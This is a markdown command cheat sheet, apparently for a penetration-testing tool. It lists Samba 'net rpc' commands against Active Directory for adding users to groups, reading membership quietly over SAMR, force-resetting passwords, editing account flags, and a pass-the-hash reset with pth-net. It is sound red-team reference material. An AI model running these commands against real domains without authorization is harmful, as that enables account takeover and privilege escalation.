# Netrpc

## netrpc (Samba RPC / net rpc)

### Add to group

Add a member to a domain group via SAMR over RPC. Useful when LDAP write is blocked but SAMR is open.

```sh title:"Add member to group via SAMR over RPC"
net rpc group addmem "$group" "$target_user" -U "$domain"/"$user"%"$pass" -S "$rhost_name"
```
<!-- cheat
import users
import passwords
import domain_ip
var group
var rhost_name
var target_user
-->

### List group members

Read group membership over SAMR. Quieter than LDAP for fast peeks.

```sh title:"Read group membership over SAMR"
net rpc group members "$group" -U "$domain"/"$user"%"$pass" -S "$rhost_name"
```
<!-- cheat
import users
import passwords
import domain_ip
var group
var rhost_name
-->

### List group members (FQDN DC)

Same membership read, target specified as FQDN. Use when NetBIOS resolution is broken.

```sh title:"Read group members targeting DC by FQDN"
net rpc group members "$group" -U "$domain"/"$user"%'$pass' -S "$rhost_name"
```
<!-- cheat
import users
import passwords
import domain_ip
var group
var rhost_name
-->

### Add service account to group

Convenience variant for adding a service account into a group. Same primitive, named for clarity.

```sh title:"Add service account into group via SAMR"
net rpc group addmem "$group" "$service_account" -U "$domain"/"$user"%"$pass" -S "$rhost_name"
```
<!-- cheat
import users
import passwords
import domain_ip
var group
var service_account
var rhost_name
-->

### Change user password

Force-set a target user's password via SAMR. Requires Reset Password right.

```sh title:"Force set target password via SAMR (needs reset right)"
net rpc password "$target_user" "$target_pass" -U "$domain"/"$user"%"$pass" -S "$domain"
```
<!-- cheat
import users
import passwords
import domain_ip
var target_user
var target_pass
-->

### Change password (alt user)

Same password reset, alternate authenticated user format pointed at a specific DC by name.

```sh title:"Password reset, alternate user format vs DC by name"
net rpc password "$target_user" "$target_pass" -U "$domain"/"$user"%"$pass" -S "$rhost_name"
```
<!-- cheat
import users
import passwords
import domain_ip
var rhost_name
var target_user
var target_pass
-->

### Change password (FQDN DC)

Same password reset, DC referenced by FQDN.

```sh title:"Password reset, DC referenced by FQDN"
net rpc password "$target_user" "$target_pass" -U "$domain"/"$user"%'$pass' -S "$rhost_name"
```
<!-- cheat
import users
import passwords
import domain_ip
var rhost_name
var target_user
var target_pass
-->

### Edit user

Open the SAMR-side user editor to flip flags and reset attributes.

```sh title:"SAMR user editor for flag / attribute changes"
net rpc user edit "$target_user" -U "$domain"/"$user"%'$pass' -S "$rhost_name"
```
<!-- cheat
import users
import passwords
import domain_ip
var rhost_name
var target_user
-->

### Password change w/hash

Pass-the-hash variant of the password reset using `pth-net` (LM:NT format).

```sh title:"Pass-the-hash password reset via pth-net"
pth-net rpc password "$target_user" "$target_pass" -U "$domain"/"$user"%"$hash:$hash" -S "$rhost_name"
```
<!-- cheat
import users
import passwords
import domain_ip
var hash
var rhost_name
var target_user
var target_pass
-->
